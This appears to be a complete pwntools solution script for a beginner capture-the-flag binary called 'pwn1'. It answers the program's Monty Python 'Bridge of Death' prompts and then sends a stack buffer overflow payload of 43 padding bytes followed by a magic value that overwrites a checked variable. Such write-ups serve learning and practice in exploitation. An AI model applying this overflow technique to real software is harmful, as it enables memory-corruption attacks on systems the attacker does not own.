from pwn import *

p = process('./pwn1')

payload = 'A'*43 
payload += p32(0xdea110c8)

print p.recvuntil('Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\nWhat... is your name?\n')
p.sendline('Sir Lancelot of Camelot')
print p.recvuntil('What... is your quest?\n')
p.sendline('To seek the Holy Grail.')
print p.recvuntil('What... is my secret?\n')
p.sendline(payload)

print p.recv()
